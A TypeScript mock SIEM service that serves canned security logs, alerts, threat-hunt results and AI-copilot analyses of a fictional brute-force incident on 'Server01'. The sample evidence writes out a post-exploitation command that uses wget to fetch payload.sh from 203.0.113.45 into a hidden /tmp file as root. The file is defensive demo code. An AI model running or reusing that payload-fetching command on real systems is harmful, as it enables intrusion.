// ============================================================
// MockSiemService — in-memory implementation of SiemService.
// All data is served from mockData.ts.
// To replace with a real backend: implement SiemService in
// src/services/api/HttpSiemService.ts and update services/index.ts.
// ============================================================

import type { SiemService } from '../SiemService';
import type {
  SecurityLog,
  SecurityAlert,
  Incident,
  DetectionRule,
  CopilotMessage,
  CopilotResponse,
  ThreatHuntQuery,
  DashboardStats,
  AnalyticsData,
  AlertFilter,
  LogFilter,
  PaginatedResult,
} from '../../types';
import {
  MOCK_LOGS,
  MOCK_ALERTS,
  MOCK_INCIDENTS,
  MOCK_DETECTION_RULES,
  MOCK_DASHBOARD_STATS,
  generateAnalytics,
} from './mockData';

// Simulates a network round-trip latency
function delay(ms: number = 400): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

function paginate<T>(items: T[], page: number = 1, pageSize: number = 25): PaginatedResult<T> {
  const start = (page - 1) * pageSize;
  return {
    items: items.slice(start, start + pageSize),
    total: items.length,
    page,
    pageSize,
  };
}

let copilotMessageIdCounter = 100;
const copilotHistory: CopilotMessage[] = [];

// Internal mutable state for detection rules (to support toggle)
const mutableRules: DetectionRule[] = MOCK_DETECTION_RULES.map((r) => ({ ...r }));

function buildCopilotResponse(message: string, incidentId?: string): CopilotResponse {
  const lowerMsg = message.toLowerCase();

  if (incidentId === 'INC-00142' || lowerMsg.includes('incident') || lowerMsg.includes('compromise') || lowerMsg.includes('brute')) {
    if (lowerMsg.includes('summar') || lowerMsg.includes('what happened')) {
      return {
        leadIn: 'Analysis based on 29 correlated security events across INC-00142',
        eventCount: 29,
        observedEvidence: [
          '25 failed SSH authentication attempts from 192.168.1.50 to admin@Server01 between 09:00:00–09:00:55 (55-second window)',
          'Successful authentication for admin from 192.168.1.50 at 09:01:10 — immediately following the failure sequence',
          'Privilege escalation to root via sudo at 09:02:34 (84 seconds post-compromise)',
          'Process execution: wget http://203.0.113.45/payload.sh -O /tmp/.x as root at 09:03:12',
          'Outbound TCP connection from Server01 to 203.0.113.45:443 at 09:04:45',
        ],
        aiAssessment: 'The evidence pattern is consistent with a successful automated brute-force attack against the admin account on Server01, followed by systematic post-exploitation activity. The tight temporal sequence (under 5 minutes from first attempt to external connection) and the hidden-filename wget behavior are consistent with scripted post-exploitation tooling. The incident requires urgent investigation — Server01 may be actively under adversary control. This is an assessment based on behavioral indicators, not a confirmed breach determination.',
        recommendedNextSteps: [
          'Isolate Server01 from the network immediately to contain possible lateral movement',
          'Revoke admin credentials and invalidate all active sessions',
          'Forensically examine /tmp/.x and any processes descended from PID 7721',
          'Investigate 203.0.113.45 for threat intelligence matches',
          'Audit all other servers for similar connection patterns from 192.168.1.50',
        ],
      };
    }
    if (lowerMsg.includes('after') && lowerMsg.includes('login') || lowerMsg.includes('post')) {
      return {
        leadIn: 'Analyzing post-authentication activity in INC-00142',
        eventCount: 4,
        observedEvidence: [
          'Successful authentication at 09:01:10 — no prior successful auth from 192.168.1.50 in 30 days',
          'Root privilege obtained via sudo at 09:02:34',
          'wget executed to retrieve external script at 09:03:12',
          'Established outbound connection to 203.0.113.45:443 at 09:04:45',
        ],
        aiAssessment: 'After the successful login, three distinct post-exploitation behaviors were observed within 4 minutes. The privilege escalation and subsequent process execution follow a pattern consistent with automated post-exploitation frameworks. The outbound connection to 203.0.113.45 on port 443 could represent C2 communication or data exfiltration — HTTPS is commonly used to blend with legitimate traffic. The rapid, sequential nature of these events is consistent with scripted execution rather than manual attacker activity.',
        recommendedNextSteps: [
          'Determine whether /tmp/.x was executed — check running processes and cron jobs',
          'Block 203.0.113.45 at the perimeter firewall immediately',
          'Perform memory forensics on Server01 to capture any in-memory malware',
          'Review network egress logs for any large data transfers to external IPs',
        ],
      };
    }
    if (lowerMsg.includes('next') || lowerMsg.includes('invest') || lowerMsg.includes('should')) {
      return {
        leadIn: 'Recommended investigation priorities for INC-00142',
        eventCount: 29,
        observedEvidence: [
          'INC-00142 is currently INVESTIGATING status',
          'Last event observed at 09:04:45 — external connection to 203.0.113.45',
          'No containment actions recorded yet in the incident timeline',
          'Server01 remains online and potentially accessible',
        ],
        aiAssessment: 'Based on the current incident state, the most urgent gap is containment — Server01 appears to still be accessible and the outbound connection to 203.0.113.45 has not been confirmed as terminated. Immediate network isolation should take priority over extended forensic investigation to prevent further data exposure or lateral movement.',
        recommendedNextSteps: [
          'Priority 1 — Network isolation of Server01 (immediate)',
          'Priority 2 — Block 203.0.113.45 at perimeter firewall',
          'Priority 3 — Credential reset for admin account (all systems)',
          'Priority 4 — Forensic image of Server01 disk and memory',
          'Priority 5 — Threat intel lookup for 192.168.1.50 and 203.0.113.45',
          'Priority 6 — Lateral movement check — identify other systems admin account has accessed',
        ],
      };
    }
    if (lowerMsg.includes('suspicious') || lowerMsg.includes('why')) {
      return {
        leadIn: 'Explanation of why INC-00142 was flagged as suspicious',
        eventCount: 29,
        observedEvidence: [
          '25 failed logins in 55 seconds from a single IP — machine-rate, not human-rate behavior',
          'Successful login immediately after failure sequence — pattern is characteristic of successful credential guessing',
          '192.168.1.50 has zero prior successful authentication records on this system',
          'Root access obtained within 2 minutes of login — extremely rapid for legitimate admin work',
          'Process execution of wget to an external IP immediately after root escalation',
        ],
        aiAssessment: 'Each individual event could have an innocent explanation — rapid logins might be a misconfigured script, the process might be a legitimate admin task. What makes this suspicious is the correlated sequence: the statistical likelihood of all five events occurring in legitimate sequence (brute-force pattern → success from unknown IP → immediate root escalation → external script download) is very low. The correlation engine flagged this because no single event triggered the incident — the temporal and behavioral pattern across all events triggered it.',
        recommendedNextSteps: [
          'Verify whether admin is aware of and authorized this session',
          'Check whether 192.168.1.50 is a known internal management host',
          'Review whether wget to external URLs is an authorized operation on Server01',
        ],
      };
    }
  }

  // Generic fallback response
  return {
    leadIn: `Analysis based on available security context`,
    eventCount: undefined,
    observedEvidence: [
      'Query received without specific incident context',
      'Reviewing available security event data',
      'No high-confidence specific evidence identified for this query pattern',
    ],
    aiAssessment: 'Without a specific incident context, I can provide general guidance. Select an incident from the sidebar to ground analysis in specific evidence. General security posture: 1 critical incident (INC-00142) is currently under investigation, 5 alerts require attention.',
    recommendedNextSteps: [
      'Select an incident from the sidebar to begin evidence-grounded analysis',
      'Review the Security Overview dashboard for current threat posture',
      'Check Alerts for items requiring analyst attention',
    ],
  };
}

export class MockSiemService implements SiemService {
  async getDashboardStats(): Promise<DashboardStats> {
    await delay(300);
    return { ...MOCK_DASHBOARD_STATS };
  }

  async getLogs(filter?: LogFilter, page: number = 1, pageSize: number = 25): Promise<PaginatedResult<SecurityLog>> {
    await delay(350);
    let logs = [...MOCK_LOGS];

    if (filter) {
      if (filter.search) {
        const q = filter.search.toLowerCase();
        logs = logs.filter(
          (l) =>
            l.sourceIp.includes(q) ||
            l.destinationIp.includes(q) ||
            l.username.toLowerCase().includes(q) ||
            l.eventType.toLowerCase().includes(q) ||
            l.device.toLowerCase().includes(q) ||
            l.rawLog.toLowerCase().includes(q),
        );
      }
      if (filter.sourceIp) logs = logs.filter((l) => l.sourceIp === filter.sourceIp);
      if (filter.destinationIp) logs = logs.filter((l) => l.destinationIp === filter.destinationIp);
      if (filter.username) logs = logs.filter((l) => l.username.toLowerCase().includes(filter.username!.toLowerCase()));
      if (filter.eventType) logs = logs.filter((l) => l.eventType === filter.eventType);
      if (filter.status) logs = logs.filter((l) => l.status === filter.status);
      if (filter.device) logs = logs.filter((l) => l.device.toLowerCase().includes(filter.device!.toLowerCase()));
    }

    logs.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
    return paginate(logs, page, pageSize);
  }

  async getLogById(id: string): Promise<SecurityLog | null> {
    await delay(200);
    return MOCK_LOGS.find((l) => l.id === id) ?? null;
  }

  async getLogsByIds(ids: string[]): Promise<SecurityLog[]> {
    await delay(200);
    return MOCK_LOGS.filter((l) => ids.includes(l.id));
  }

  async getAlerts(filter?: AlertFilter, page: number = 1, pageSize: number = 25): Promise<PaginatedResult<SecurityAlert>> {
    await delay(350);
    let alerts = [...MOCK_ALERTS];

    if (filter) {
      if (filter.search) {
        const q = filter.search.toLowerCase();
        alerts = alerts.filter(
          (a) =>
            a.title.toLowerCase().includes(q) ||
            a.sourceIp.includes(q) ||
            a.username.toLowerCase().includes(q) ||
            a.device.toLowerCase().includes(q) ||
            a.detectionRuleName.toLowerCase().includes(q),
        );
      }
      if (filter.severity) alerts = alerts.filter((a) => a.severity === filter.severity);
      if (filter.status) alerts = alerts.filter((a) => a.status === filter.status);
      if (filter.sourceIp) alerts = alerts.filter((a) => a.sourceIp.includes(filter.sourceIp!));
      if (filter.username) alerts = alerts.filter((a) => a.username.toLowerCase().includes(filter.username!.toLowerCase()));
      if (filter.detectionType) alerts = alerts.filter((a) => a.detectionRuleName.toLowerCase().includes(filter.detectionType!.toLowerCase()));
    }

    alerts.sort((a, b) => new Date(b.lastSeen).getTime() - new Date(a.lastSeen).getTime());
    return paginate(alerts, page, pageSize);
  }

  async getAlertById(id: string): Promise<SecurityAlert | null> {
    await delay(250);
    return MOCK_ALERTS.find((a) => a.id === id) ?? null;
  }

  async getAlertsByIds(ids: string[]): Promise<SecurityAlert[]> {
    await delay(250);
    return MOCK_ALERTS.filter((a) => ids.includes(a.id));
  }

  async getIncidents(page: number = 1, pageSize: number = 20): Promise<PaginatedResult<Incident>> {
    await delay(350);
    const sorted = [...MOCK_INCIDENTS].sort(
      (a, b) => new Date(b.lastSeen).getTime() - new Date(a.lastSeen).getTime(),
    );
    return paginate(sorted, page, pageSize);
  }

  async getIncidentById(id: string): Promise<Incident | null> {
    await delay(300);
    return MOCK_INCIDENTS.find((i) => i.id === id) ?? null;
  }

  async getDetectionRules(): Promise<DetectionRule[]> {
    await delay(200);
    return [...mutableRules];
  }

  async toggleDetectionRule(id: string, enabled: boolean): Promise<DetectionRule> {
    await delay(150);
    const rule = mutableRules.find((r) => r.id === id);
    if (!rule) throw new Error(`Rule ${id} not found`);
    rule.enabled = enabled;
    return { ...rule };
  }

  async runThreatHunt(queryText: string): Promise<ThreatHuntQuery> {
    await delay(1200); // simulate heavier processing
    const q = queryText.toLowerCase();
    const id = `hunt-${Date.now()}`;

    // Match queries to realistic results
    if (q.includes('brute') || q.includes('failed login') || q.includes('authentication fail')) {
      const matchingLogs = MOCK_LOGS.filter((l) => l.eventType === 'LOGIN_FAILED');
      return {
        id,
        queryText,
        timestamp: new Date().toISOString(),
        status: 'done',
        interpretation: 'Searching for repeated failed authentication events — potential brute-force or credential spray activity',
        matchingLogIds: matchingLogs.map((l) => l.id),
        relatedAlertIds: ['alert-001', 'alert-006', 'alert-007'],
        riskIndicators: [
          '25 rapid failed logins from 192.168.1.50 — consistent with automated attack tooling',
          'Credential spray pattern from 10.0.0.55 across 5 distinct accounts',
          'Distributed attack from 3 IPs targeting john.doe',
        ],
      };
    }

    if (q.includes('privilege') || q.includes('escalat') || q.includes('sudo') || q.includes('root')) {
      const matchingLogs = MOCK_LOGS.filter((l) => l.eventType === 'PRIVILEGE_CHANGE');
      return {
        id,
        queryText,
        timestamp: new Date().toISOString(),
        status: 'done',
        interpretation: 'Searching for privilege change or escalation events',
        matchingLogIds: matchingLogs.map((l) => l.id),
        relatedAlertIds: ['alert-003'],
        riskIndicators: [
          'Privilege escalation by admin on Server01 at 09:02:34 — within 2 minutes of suspicious login',
          'Root shell obtained via sudo — occurred during active incident window INC-00142',
        ],
      };
    }

    if (q.includes('external') || q.includes('outbound') || q.includes('connection') || q.includes('network')) {
      const matchingLogs = MOCK_LOGS.filter((l) => l.eventType === 'NETWORK_CONNECTION' || l.eventType === 'CONNECTION_BLOCKED');
      return {
        id,
        queryText,
        timestamp: new Date().toISOString(),
        status: 'done',
        interpretation: 'Searching for external or suspicious network connection events',
        matchingLogIds: matchingLogs.map((l) => l.id),
        relatedAlertIds: ['alert-004', 'alert-005'],
        riskIndicators: [
          'Outbound connection from Server01 to 203.0.113.45:443 — external non-whitelisted IP',
          'Port scan from 192.168.1.72 to 10.0.0.15 — 20 ports in 28 seconds',
        ],
      };
    }

    if (q.includes('suspicious login') || q.includes('off-hours') || q.includes('unusual')) {
      const matchingLogs = MOCK_LOGS.filter(
        (l) => l.relatedAlertIds.length > 0 && (l.eventType === 'LOGIN' || l.eventType === 'LOGIN_FAILED'),
      );
      return {
        id,
        queryText,
        timestamp: new Date().toISOString(),
        status: 'done',
        interpretation: 'Searching for unusual or suspicious login patterns',
        matchingLogIds: matchingLogs.map((l) => l.id),
        relatedAlertIds: ['alert-001', 'alert-002', 'alert-008'],
        riskIndicators: [
          'Successful login from previously unseen IP 192.168.1.50 immediately after brute-force pattern',
          'Off-hours login by john.doe at 01:15 from internal IP 10.0.0.25',
        ],
      };
    }

    if (q.includes('high risk') || q.includes('critical')) {
      const matchingLogs = MOCK_LOGS.filter((l) => l.relatedIncidentIds.includes('INC-00142'));
      return {
        id,
        queryText,
        timestamp: new Date().toISOString(),
        status: 'done',
        interpretation: 'Searching for high-risk and critical security events',
        matchingLogIds: matchingLogs.map((l) => l.id),
        relatedAlertIds: ['alert-001', 'alert-002', 'alert-003', 'alert-004'],
        riskIndicators: [
          '29 events correlated to CRITICAL incident INC-00142',
          'Privilege escalation and external connection observed within incident window',
        ],
      };
    }

    if (q.includes('ip') || q.includes('source') || q.includes('192.168') || q.includes('from ip')) {
      const matchingLogs = MOCK_LOGS.filter((l) => l.sourceIp === '192.168.1.50');
      return {
        id,
        queryText,
        timestamp: new Date().toISOString(),
        status: 'done',
        interpretation: 'Searching for activity from the specified source IP address',
        matchingLogIds: matchingLogs.map((l) => l.id),
        relatedAlertIds: ['alert-001', 'alert-002'],
        riskIndicators: [
          '192.168.1.50 is the source of 25 failed + 1 successful login against Server01',
          'This IP is linked to CRITICAL incident INC-00142',
        ],
      };
    }

    // No specific match
    return {
      id,
      queryText,
      timestamp: new Date().toISOString(),
      status: 'done',
      interpretation: `General security event search for: "${queryText}"`,
      matchingLogIds: [],
      relatedAlertIds: [],
      riskIndicators: [],
    };
  }

  async sendCopilotMessage(message: string, incidentId?: string): Promise<CopilotMessage> {
    // Analyst message
    const analystMsg: CopilotMessage = {
      id: `msg-${++copilotMessageIdCounter}`,
      role: 'analyst',
      content: message,
      timestamp: new Date().toISOString(),
      incidentId,
    };
    copilotHistory.push(analystMsg);

    await delay(1800); // simulate AI processing time

    const response = buildCopilotResponse(message, incidentId);
    const copilotMsg: CopilotMessage = {
      id: `msg-${++copilotMessageIdCounter}`,
      role: 'copilot',
      content: response.leadIn,
      timestamp: new Date().toISOString(),
      incidentId,
      response,
    };
    copilotHistory.push(copilotMsg);

    return copilotMsg;
  }

  async getCopilotHistory(_incidentId?: string): Promise<CopilotMessage[]> {
    await delay(150);
    return [...copilotHistory];
  }

  async getAnalytics(days: number): Promise<AnalyticsData> {
    await delay(400);
    return generateAnalytics(days);
  }
}
